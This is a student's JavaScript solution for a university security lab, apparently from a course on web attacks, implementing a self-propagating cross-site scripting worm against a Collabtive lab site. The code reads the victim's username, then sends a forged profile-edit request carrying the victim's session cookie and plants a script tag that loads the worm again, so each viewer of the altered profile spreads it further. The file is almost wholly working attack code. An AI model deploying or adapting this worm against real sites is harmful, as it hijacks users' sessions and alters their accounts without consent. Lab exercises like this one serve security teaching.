//Bradford Smith (bsmith8)
//CS 577 Lab 6 worm.js
//10/29/2015
//"I pledge my honor that I have abided by the Stevens Honor System."

var uname;
//use PeriodicalUpdater to get user's name
var on=new Ajax.PeriodicalUpdater("onlinelist","manageuser.php?action=onlinelist",{method:'get',onSuccess:function(transport){var div=document.createElement('div');div.innerHTML=transport.responseText;uname=new String(div.firstChild.childNodes[0].childNodes[0].text).trim();div=null;},frequency:1000});

//stop updater and call worm function
setTimeout("on.stop();worm();",2000);

function worm()
{
    var Ajax=null;

    //this is to inject for self-propagation
    var worm=escape("Worms Inc<script type='text/javascript' src='worm.js'></script>");

    //this is to inject the course url
    var my_url=escape("http://www.cs.stevens.edu/~gportoka/cs577.html");

    //the POST content
    var content="name="+uname+"&email=i.am@pwn.ed"+"&company="+worm+"&web="+my_url;

    //create the HTTP header
    Ajax=new XMLHttpRequest();
    Ajax.open("POST","http://www.xsslabcollabtive.com/manageuser.php?action=edit",true);
    Ajax.withCredentials = true;
    Ajax.setRequestHeader("Host","www.xsslabcollabtive.com");
    //get the user's cookie
    Ajax.setRequestHeader("Cookie",document.cookie);
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

    //alert("'"+uname+"'");
    Ajax.send(content);
};
